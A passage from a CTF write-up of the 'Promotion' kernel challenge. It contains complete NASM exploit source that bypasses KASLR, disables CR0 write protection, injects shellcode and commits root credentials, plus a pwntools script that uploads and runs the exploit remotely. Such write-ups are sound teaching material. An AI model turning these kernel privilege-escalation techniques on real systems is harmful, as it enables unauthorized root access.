  [RSP + 0]  →  RIP     (where to resume execution)
  [RSP + 8]  →  CS      (code segment, determines ring level)
  [RSP + 16] →  RFLAGS  (processor flags)
  [RSP + 24] →  RSP     (stack pointer to restore)
  [RSP + 32] →  SS      (stack segment)
```

We push these in reverse order (since the stack grows downward):

```asm
push qword [saved_ss]      ; SS = 0x2b (user data segment)
push qword [saved_rsp]     ; RSP = our original user stack pointer
push qword [saved_flags]   ; RFLAGS = original flags
push qword [saved_cs]      ; CS = 0x33 (user code segment, ring 3)
lea  rax, [rel .usermode]  ; RAX = address of our usermode code
push rax                    ; RIP = .usermode label
iretq                       ; Pop all 5 values and transition to ring 3
```

After `iretq`:
- **CS = 0x33** → We're back at ring 3 (user mode)
- **RIP = .usermode** → Execution continues at our `.usermode` label
- **RSP** = Our original user stack
- **SS = 0x2b** → User stack segment
- **RFLAGS** = Original flags (interrupts re-enabled, etc.)

We are now a **normal user process running at ring 3, but with UID 0 (root) credentials**.

---

## 13. Phase 4: Reading the Flag

Now we're in user mode as root. We use standard Linux syscalls to read the flag from
`/dev/sda`:

```asm
.usermode:
    ; Verify we're actually root
    mov eax, 102             ; syscall number for getuid (102 on x86-64)
    syscall                  ; returns UID in eax
    test eax, eax            ; check if UID == 0
    jnz .fail                ; if not zero, something went wrong

    ; Print success banner
    mov eax, 1               ; SYS_write
    mov edi, 1               ; fd = stdout
    lea rsi, [rel msg_ok]   ; "[+] ROOT! Flag:\n"
    mov edx, msg_ok_len     ; length of the message
    syscall

    ; Open the flag file
    mov eax, 2               ; SYS_open
    lea rdi, [rel devpath]  ; "/dev/sda"
    xor esi, esi             ; flags = O_RDONLY (0)
    xor edx, edx            ; mode = 0
    syscall
    test eax, eax
    js .exit                 ; if fd < 0, open failed

    ; Read the flag contents
    mov edi, eax             ; fd = return value from open
    xor eax, eax             ; SYS_read (0)
    lea rsi, [rel buf]      ; buffer address
    mov edx, 4096            ; read up to 4096 bytes
    syscall

    ; Write the flag to stdout
    mov edx, eax             ; number of bytes read
    mov eax, 1               ; SYS_write
    mov edi, 1               ; fd = stdout
    lea rsi, [rel buf]      ; buffer with flag contents
    syscall

    jmp .exit

.fail:
    ; Print failure message
    mov eax, 1
    mov edi, 1
    lea rsi, [rel msg_fail]  ; "[-] Not root\n"
    mov edx, msg_fail_len
    syscall

.exit:
    mov eax, 60              ; SYS_exit
    xor edi, edi             ; exit code 0
    syscall
```

**Why `/dev/sda`?** The QEMU command line includes `-hda /challenge/flag.txt`, which
presents the flag file as a raw block device. Reading `/dev/sda` gives us the raw contents
of `flag.txt`.

**Why raw syscalls instead of libc functions?** In the assembly version, there's no libc.
But even in the C version, we use raw `open`/`read`/`write` instead of `system("cat /dev/sda")`
because `system()` involves `fork`+`exec`, which crashes due to reference counting issues
with `init_cred` (see Section 14).

---

## 14. Failed Attempts and Lessons Learned

The final exploit is the result of several iterations, each teaching something new about
the kernel's defenses.

### Attempt 1: Direct Kernel Function Call from User Code

**Approach:** After `int 0x81` promotion, switch CR3 to kernel page tables, then directly
call `commit_creds(prepare_kernel_cred(0))` from our user-space code.

**What happened:**
```
BUG: kernel tried to execute NX-protected page - exploit (+0x707)
```

**Root cause:** When we switch to kernel page tables, our user code is still at the same
virtual address. But in the kernel page tables, all user pages have the **NX (No Execute)
bit set** as part of PTI's security. The CPU cannot execute our code.

Think of it this way:
- User PTs see our code at `0x401000` as: **readable, writable, executable**
- Kernel PTs see the same `0x401000` as: **readable, writable, NOT executable**

So the moment we switch CR3 to kernel PTs and try to execute the next instruction from
user memory, the CPU raises a page fault for NX violation.

**Lesson learned:** We cannot execute user code while on kernel page tables. We need to
put our code somewhere that's executable in both page tables: `.entry.text`.

### Attempt 2: Shellcode in .entry.text with `prepare_kernel_cred(NULL)`

**Approach:** Inject shellcode into `.entry.text` that does:
```
prepare_kernel_cred(NULL) → new_cred
commit_creds(new_cred)
```

This is the "classic" kernel privilege escalation technique.

**What happened:**
```
WARNING: prepare_kernel_cred: deprecated NULL credential
BUG: kernel NULL pointer dereference at commit_creds+0x26: mov rax, [rdi]
```

**Root cause:** Starting from kernel 6.17, `prepare_kernel_cred(NULL)` is deprecated. When
called with NULL, it prints a warning and **returns NULL** instead of creating a new root
credential structure. Then `commit_creds(NULL)` dereferences the NULL pointer and crashes.

This change was made by the kernel developers because `prepare_kernel_cred(NULL)` was
frequently misused and considered a security anti-pattern.

**Lesson learned:** On modern kernels (6.17+), use `commit_creds(&init_cred)` instead.
`init_cred` is a pre-existing global `struct cred` with UID=0 that doesn't need to be
created. It exists throughout the kernel's lifetime as the credentials of PID 1 (init).

### Attempt 3: C Exploit with `system()` for Flag Reading

**Approach:** After getting UID=0, call `system("cat /dev/sda")` to read the flag.

**What happened:** `getuid()` returns 0 (success!), but `system("cat /dev/sda")` segfaults.

**Root cause:** `system()` calls `fork()` + `exec()`. The `init_cred` structure is a
global with a reference count shared with the init process. When `fork()` tries to
duplicate the credentials, the reference counting gets confused because `init_cred` was
never designed to be used as a normal process's credentials this way.

**Lesson learned:** After using `commit_creds(&init_cred)`, avoid complex operations
like `fork`/`exec`. Use direct syscalls (`open`/`read`/`write`) instead.

### Attempt 4: Binary Too Large for Remote Upload

**Approach:** The C exploit works locally. Compile it statically and upload to the remote
server.

**What happened:** The statically-linked binary is **737 KB**. Even compressed with UPX
(a binary packer), it's **288 KB**. Base64-encoded for upload, that's ~380 KB of text.
The remote server has a session timeout, and the slow echo-based upload method can't
transfer that much data in time. The connection closes before the upload completes.

**Lesson learned:** Rewrite the exploit in pure assembly (NASM) with no libc dependency.
The resulting binary is only **8.6 KB** (574 bytes gzip-compressed, 768 bytes base64).
It uploads in under 1 second via two 512-byte `echo` chunks.

---

## 15. Final Exploit: Pure Assembly Version

The final exploit is written in NASM assembly, producing a tiny statically-linked ELF
binary with no external dependencies.

### Building

```bash
nasm -f elf64 exploit.asm    # Assemble to object file
ld -o exploit exploit.o       # Link to ELF binary
strip exploit                  # Remove debug symbols (optional, saves ~1KB)
```

Result: **~8.6 KB** binary.

### Size Comparison

| Version | Raw Size | Compressed | Base64 | Upload Time |
|---------|----------|------------|--------|-------------|
| C (static glibc) | 737 KB | 288 KB (UPX) | ~384 KB | **Timeout** |
| Assembly (NASM) | 8.6 KB | 574 B | 768 B | **< 1 second** |

### Local Testing

```bash
# Rebuild rootfs with exploit included
cp exploit rootfs/home/player/
cd rootfs && find . -print0 | cpio --null -ov --format=newc | gzip -9 > ../rootfs_test.cpio.gz

# Boot QEMU and run
qemu-system-x86_64 -m 128M -nographic -kernel bzImage \
    -initrd rootfs_test.cpio.gz \
    -append "console=ttyS0 kaslr pti=on oops=panic panic=1 quiet" \
    -no-reboot -cpu kvm64 -snapshot -hda flag.txt -monitor /dev/null
```

```
~ $ /home/player/exploit
[+] ROOT! Flag:
BITSCTF{test_flag_local}
```

---

## 16. Remote Exploitation

### Upload Strategy

The remote server gives us a shell inside QEMU via netcat. We need to transfer our exploit
binary. Since we only have busybox tools available (no `wget`, `curl`, `scp`), we use a
base64+gzip encoding scheme:

1. **On our machine:** Gzip-compress the binary, then base64-encode it.
2. **Over the network:** Send the base64 text as echo commands that append to a file.
3. **On the target:** Base64-decode, gunzip, chmod +x, and run.

### The Solve Script (`solve.py`)

```python
#!/usr/bin/env python3
from pwn import *
import base64, gzip

HOST = "20.193.149.152"
PORT = 1337

def main():
    # Read and compress the exploit binary
    with open("exploit", "rb") as f:
        exploit_data = f.read()

    compressed = gzip.compress(exploit_data, compresslevel=9)
    encoded = base64.b64encode(compressed).decode()
    log.info(f"Payload: {len(exploit_data)} raw -> {len(compressed)} gz -> {len(encoded)} b64")

    # Connect to the remote server
    r = remote(HOST, PORT)

    # Wait for QEMU to finish booting and give us a shell prompt
    log.info("Waiting for QEMU boot...")
    r.recvuntil(b"$ ", timeout=90)
    sleep(0.5)

    # Upload the base64-encoded payload in 512-byte chunks
    CHUNK = 512
    chunks = [encoded[i:i+CHUNK] for i in range(0, len(encoded), CHUNK)]
    log.info(f"Uploading in {len(chunks)} chunks...")

    for chunk in chunks:
        r.sendline(f"echo -n '{chunk}'>>/tmp/b".encode())
        sleep(0.1)

    # Wait for all echo commands to complete
    r.sendline(b"echo UPLOAD_DONE")
    r.recvuntil(b"UPLOAD_DONE", timeout=15)
    sleep(0.5)

    # Decode and prepare the exploit binary
    log.info("Decoding payload...")
    r.sendline(b"base64 -d /tmp/b|gunzip>/tmp/e&&chmod +x /tmp/e")
    sleep(2)

    # Run the exploit
    log.info("Running exploit!")
    r.sendline(b"/tmp/e")

    # Capture output
    r.interactive()

if __name__ == "__main__":
    main()
```

### Remote Execution Output

```
$ python3 solve.py
[*] Payload: 8624 raw -> 574 gz -> 768 b64
[+] Opening connection to 20.193.149.152 on port 1337: Done
[*] Waiting for QEMU boot...
[*] Uploading in 2 chunks...
[*] Decoding payload...
[*] Running exploit!
[+] Receiving all data: Done (669B)
[*] Output:
    ~ $ /tmp/e 2>&1; echo EXIT_CODE=$?
    [+] ROOT! Flag:
    BITSCTF{pr0m0710n5_4r3_6r347._1f_1_0nly_h4d_4_j0b...}
    EXIT_CODE=0
```

**Flag: `BITSCTF{pr0m0710n5_4r3_6r347._1f_1_0nly_h4d_4_j0b...}`**

---

## 17. Complete Exploit Flow Diagram

```
+-----------------------------------------------------------------------+
| USERSPACE - Ring 3 - UID 1000 (player)                                |
|                                                                       |
|  1. Save user state (CS, SS, RSP, RFLAGS) for later return            |
|  2. Execute: int 0x81                                                 |
|     CPU: push iret frame, jump to handler                             |
|     Handler: overwrite CS in iret frame with 0x10, iretq              |
|                                                                       |
+------------------------------|----------------------------------------+
                               | CS changed from 0x33 to 0x10
                               v
+-----------------------------------------------------------------------+
| USER CODE @ RING 0 - User Page Tables                                 |
|                                                                       |
|  3. cli (disable interrupts - prevent crashes)                        |
|  4. swapgs (switch to kernel GS for per-CPU data)                     |
|                                                                       |
|  === KASLR BYPASS ===                                                 |
|  5. sidt → read IDT base address                                     |
|  6. Parse IDT[0x81] gate → extract asm_exc_promotion address          |
|  7. kernel_base = asm_exc_promotion - 0x1d30                          |
|                                                                       |
|  === PREPARE SHELLCODE ===                                            |
|  8. Patch shellcode: init_cred = kernel_base + 0x1c54da0             |
|  9. Patch shellcode: commit_creds = kernel_base + 0x32afb0           |
|                                                                       |
|  === INJECT SHELLCODE ===                                             |
| 10. CR0.WP = 0 (disable write protection)                            |
| 11. memcpy(kernel_base + 0x1d30, shellcode, 41)                      |
|     (overwrite asm_exc_promotion with our shellcode)                  |
| 12. Restore CR0.WP                                                   |
|                                                                       |
| 13. Execute: int 0x81 (triggers our shellcode now!)                   |
|                                                                       |
+------------------------------|----------------------------------------+
                               | CPU jumps to shellcode at kernel_base + 0x1d30
                               v
+-----------------------------------------------------------------------+
| SHELLCODE IN .entry.text - Ring 0 - Runs from kernel memory           |
|                                                                       |
| 14. Save CR3 (user page tables)                                      |
| 15. CR3 &= ~0x1800 → switch to kernel page tables                   |
|     (now all kernel memory is accessible)                             |
|                                                                       |
| 16. commit_creds(&init_cred) → process is now UID 0                  |
|                                                                       |
| 17. Restore CR3 → back to user page tables                           |
| 18. iretq → return to step 19                                        |
|                                                                       |
+------------------------------|----------------------------------------+
                               | iretq back to user code
                               v
+-----------------------------------------------------------------------+
| USER CODE @ RING 0 - User Page Tables - NOW UID 0                    |
|                                                                       |
| 19. swapgs (restore user GS)                                         |
| 20. Push iretq frame: SS=0x2b, RSP, RFLAGS, CS=0x33, RIP            |
| 21. iretq → transition to ring 3                                     |
|                                                                       |
+------------------------------|----------------------------------------+
                               | Ring 0 → Ring 3
                               v
+-----------------------------------------------------------------------+
| USERSPACE - Ring 3 - UID 0 (ROOT!)                                    |
|                                                                       |
| 22. getuid() == 0 ✓                                                  |
| 23. fd = open("/dev/sda", O_RDONLY)                                   |
| 24. n = read(fd, buf, 4096)                                          |
| 25. write(stdout, buf, n)                                             |
|                                                                       |
| OUTPUT: BITSCTF{pr0m0710n5_4r3_6r347._1f_1_0nly_h4d_4_j0b...}       |
|                                                                       |
| 26. exit(0)                                                           |
+-----------------------------------------------------------------------+
```

---

## 18. Glossary of Concepts

### CPU Registers and Instructions

| Term | Description |
|------|-------------|
| **CR0** | Control Register 0. Contains flags controlling CPU behavior. Bit 16 (WP) enables/disables write protection for ring 0. |
| **CR3** | Control Register 3. Points to the base of the current page table hierarchy (PGD). Changing CR3 switches the active address space. |
| **CS** | Code Segment register. The low 2 bits indicate the Current Privilege Level (CPL): 0 = kernel, 3 = user. |
| **SS** | Stack Segment register. Paired with RSP for stack operations. |
| **RFLAGS** | Flags register. Contains status flags (ZF, CF, etc.) and control flags (IF for interrupt enable). |
| **GS** | Segment register used by Linux for per-CPU data (kernel mode) or Thread-Local Storage (user mode). |
| **`int N`** | Software interrupt instruction. Looks up vector N in the IDT and transfers control to the handler. |
| **`iretq`** | Interrupt Return (64-bit). Pops RIP, CS, RFLAGS, RSP, SS from the stack and resumes execution. Used for privilege transitions. |
| **`cli`** | Clear Interrupt Flag. Disables hardware interrupts. Ring 0 only. |
| **`sidt`** | Store IDT Register. Saves the IDT base address and limit to memory. Works at any privilege level but only useful at ring 0 with KASLR. |
| **`swapgs`** | Swap GS base with MSR_KERNEL_GS_BASE. Used at kernel entry/exit to switch between user and kernel GS. |
| **`rep movsb`** | Repeat move string byte. Copies ECX bytes from [RSI] to [RDI]. Like memcpy(). |

### Kernel Security Mechanisms

| Term | Description |
|------|-------------|
| **KASLR** | Kernel Address Space Layout Randomization. Randomizes the kernel's base virtual address at each boot by a random offset (aligned to 2MB). All kernel symbols shift by the same offset. |
| **PTI / KPTI** | Page Table Isolation (also called Kernel Page Table Isolation). Maintains separate page tables for user and kernel mode. User page tables only map a minimal kernel "trampoline" (`.entry.text`). Kernel page tables map everything but mark user pages as NX. Originally created as a mitigation for the Meltdown CPU vulnerability. |
| **SMEP** | Supervisor Mode Execution Prevention. A CPU feature that prevents ring 0 from executing code in user-mapped pages. Causes a page fault if attempted. Not available on kvm64. |
| **SMAP** | Supervisor Mode Access Prevention. A CPU feature that prevents ring 0 from reading/writing user-mapped pages. Not available on kvm64. |
| **CR0.WP** | Write Protect bit in CR0. When set, ring 0 code respects read-only page protections. When clear, ring 0 can write anywhere. |
| **NX bit** | No-Execute bit in page table entries. When set, code execution from that page causes a fault. Used by PTI to prevent kernel-mode execution of user code. |

### Kernel Data Structures

| Term | Description |
|------|-------------|
| **IDT** | Interrupt Descriptor Table. A CPU-managed array of 256 gate descriptors. Each entry defines how to handle a specific interrupt/exception vector. |
| **Gate Descriptor** | A 16-byte IDT entry. Contains the handler's address (split across 3 fields), the code segment selector, DPL (who can invoke it), and type (interrupt vs. trap gate). |
| **DPL** | Descriptor Privilege Level. The maximum ring number (0-3) allowed to invoke this gate via a software `int` instruction. DPL=3 means user code can invoke it. DPL=0 means kernel only. |
| **iret frame** | The 5 values pushed by the CPU when handling an interrupt: SS, RSP, RFLAGS, CS, RIP. The `iretq` instruction pops these to return from an interrupt. |
| **TSS** | Task State Segment. Contains, among other things, the kernel stack pointer that the CPU loads when transitioning from ring 3 to ring 0. |
| **`.entry.text`** | A special kernel code section containing interrupt/syscall entry and exit handlers. Mapped executable in BOTH user and kernel page tables because it's needed for privilege transitions. |
| **`struct cred`** | The kernel structure representing a process's credentials (UIDs, GIDs, capabilities). |
| **`init_cred`** | A global kernel `struct cred` initialized with UID=0, GID=0, and full capabilities. Used by the init process (PID 1). |
| **`commit_creds()`** | Kernel function that sets the current process's credentials to the provided `struct cred`. |

---

## 19. Full Source Code

### exploit.asm (Final - Pure Assembly)

```asm
; Promotion - Kernel Exploit (pure asm, ~8KB binary)
; Build: nasm -f elf64 exploit.asm && ld -o exploit exploit.o && strip exploit

BITS 64

%define SYS_READ    0
%define SYS_WRITE   1
%define SYS_OPEN    2
%define SYS_EXIT    60
%define O_RDONLY    0

section .data
    devpath: db "/dev/sda", 0
    msg_ok:  db "[+] ROOT! Flag:", 10
    msg_ok_len equ $ - msg_ok
    msg_fail: db "[-] Not root", 10
    msg_fail_len equ $ - msg_fail

    ; Shellcode to inject into asm_exc_promotion
    ; Switches to kernel PTs, calls commit_creds(&init_cred), restores
    shellcode:
        db 0x0f, 0x20, 0xd8              ; mov rax, cr3
        db 0x50                            ; push rax
        db 0x48, 0x25, 0xff, 0xe7, 0xff, 0xff ; and rax, ~0x1800
        db 0x0f, 0x22, 0xd8              ; mov cr3, rax
        db 0x48, 0xbf                     ; movabs rdi, <init_cred>
    sc_init_off equ $ - shellcode
        dq 0                               ; placeholder: init_cred addr
        db 0x48, 0xb8                     ; movabs rax, <commit_creds>
    sc_cc_off equ $ - shellcode
        dq 0                               ; placeholder: commit_creds addr
        db 0xff, 0xd0                     ; call rax
        db 0x58                            ; pop rax
        db 0x0f, 0x22, 0xd8              ; mov cr3, rax
        db 0x48, 0xcf                     ; iretq
    sc_len equ $ - shellcode

section .bss
    buf: resb 4096
    saved_cs:    resq 1
    saved_ss:    resq 1
    saved_rsp:   resq 1
    saved_flags: resq 1

section .text
    global _start

_start:
    ; === Save user state ===
    mov [saved_cs], cs
    mov [saved_ss], ss
    mov rax, rsp
    mov [saved_rsp], rax
    pushfq
    pop qword [saved_flags]

    ; === Phase 1: int 0x81 -> ring 0 promotion ===
    int 0x81
    ; Now CS=0x10 (ring 0), user PTs, user RSP, SS=0

    cli
    swapgs

    ; === KASLR bypass: read IDT[0x81] ===
    sub rsp, 16
    sidt [rsp]
    mov rdi, [rsp+2]           ; IDT base
    add rsp, 16

    ; Parse IDT gate for vector 0x81 (offset 0x81*16 = 0x810)
    lea rsi, [rdi + 0x810]
    movzx eax, word [rsi]      ; offset[15:0]
    mov edx, [rsi+8]           ; offset[63:32]
    shl rdx, 32
    or rax, rdx
    movzx edx, word [rsi+6]   ; offset[31:16]
    shl rdx, 16
    or rax, rdx                ; rax = asm_exc_promotion addr

    ; kernel_base = handler - 0x1d30
    sub rax, 0x1d30
    mov rbx, rax               ; rbx = kernel_base

    ; === Patch shellcode with KASLR-adjusted addresses ===
    ; init_cred = kernel_base + 0x1c54da0
    lea rax, [rbx + 0x1c54da0]
    mov [rel shellcode + sc_init_off], rax

    ; commit_creds = kernel_base + 0x32afb0
    lea rax, [rbx + 0x32afb0]
    mov [rel shellcode + sc_cc_off], rax

    ; === Disable WP, copy shellcode to .entry.text ===
    mov rax, cr0
    mov r15, rax               ; save CR0
    and eax, ~(1 << 16)       ; clear WP
    mov cr0, rax

    ; Copy shellcode to asm_exc_promotion (kernel_base + 0x1d30)
    lea rdi, [rbx + 0x1d30]   ; destination
    lea rsi, [rel shellcode]   ; source
    mov ecx, sc_len
    rep movsb

    ; Restore WP
    mov cr0, r15

    ; === Phase 2: Trigger patched handler ===
    int 0x81
    ; Shellcode ran: switched to kernel PTs, called commit_creds(&init_cred),
    ; restored user PTs, iretq'd back here.

    ; === Phase 3: Return to usermode ===
    swapgs

    ; Build iret frame for ring 3
    push qword [saved_ss]      ; SS
    push qword [saved_rsp]     ; RSP
    push qword [saved_flags]   ; RFLAGS
    push qword [saved_cs]      ; CS
    lea rax, [rel .usermode]
    push rax                    ; RIP
    iretq

.usermode:
    ; === Now in ring 3 as root, read flag ===
    ; Check uid
    mov eax, 102               ; SYS_getuid
    syscall
    test eax, eax
    jnz .fail

    ; Print success message
    mov eax, SYS_WRITE
    mov edi, 1
    lea rsi, [rel msg_ok]
    mov edx, msg_ok_len
    syscall

    ; open("/dev/sda", O_RDONLY)
    mov eax, SYS_OPEN
    lea rdi, [rel devpath]
    xor esi, esi               ; O_RDONLY
    xor edx, edx
    syscall
    test eax, eax
    js .exit

    ; read(fd, buf, 4096)
    mov edi, eax
    xor eax, eax               ; SYS_READ
    lea rsi, [rel buf]
    mov edx, 4096
    syscall

    ; write(1, buf, n)
    mov edx, eax               ; n bytes
    mov eax, SYS_WRITE
    mov edi, 1
    lea rsi, [rel buf]
    syscall

    ; write newline
    mov eax, SYS_WRITE
    mov edi, 1
    lea rsi, [rel msg_ok]      ; reuse for a byte
    mov edx, 1
    syscall
    jmp .exit

.fail:
    mov eax, SYS_WRITE
    mov edi, 1
    lea rsi, [rel msg_fail]
    mov edx, msg_fail_len
    syscall

.exit:
    mov eax, SYS_EXIT
    xor edi, edi
    syscall
```

### solve.py (Remote Exploit Delivery)

```python
#!/usr/bin/env python3
"""
Solve script for 'Promotion' kernel pwn challenge.
Pure asm exploit (~8KB raw, ~768 bytes base64+gzip) - uploads in < 1 second.
"""
from pwn import *
import base64, gzip

HOST = "20.193.149.152"
PORT = 1337

def main():
    with open("exploit", "rb") as f:
        exploit_data = f.read()

    compressed = gzip.compress(exploit_data, compresslevel=9)
    encoded = base64.b64encode(compressed).decode()
    log.info(f"Payload: {len(exploit_data)} raw -> {len(compressed)} gz -> {len(encoded)} b64")

    r = remote(HOST, PORT)

    log.info("Waiting for QEMU boot...")
    r.recvuntil(b"$ ", timeout=90)
    sleep(0.5)

    CHUNK = 512
    chunks = [encoded[i:i+CHUNK] for i in range(0, len(encoded), CHUNK)]
    log.info(f"Uploading in {len(chunks)} chunks...")

    for chunk in chunks:
        r.sendline(f"echo -n '{chunk}'>>/tmp/b".encode())
        sleep(0.1)

    r.sendline(b"echo UPLOAD_DONE")
    r.recvuntil(b"UPLOAD_DONE", timeout=15)
    sleep(0.5)

    log.info("Decoding payload...")
    r.sendline(b"base64 -d /tmp/b|gunzip>/tmp/e&&chmod +x /tmp/e")
    sleep(2)

    log.info("Running exploit!")
    r.sendline(b"/tmp/e 2>&1; echo EXIT_CODE=$?")

    try:
        data = r.recvall(timeout=10)
        log.info(f"Output:\n{data.decode(errors='replace')}")
    except:
        try:
            data = r.recv(timeout=5)
            log.info(f"Partial output:\n{data.decode(errors='replace')}")
        except:
            log.warning("No output received")

if __name__ == "__main__":
    main()
```
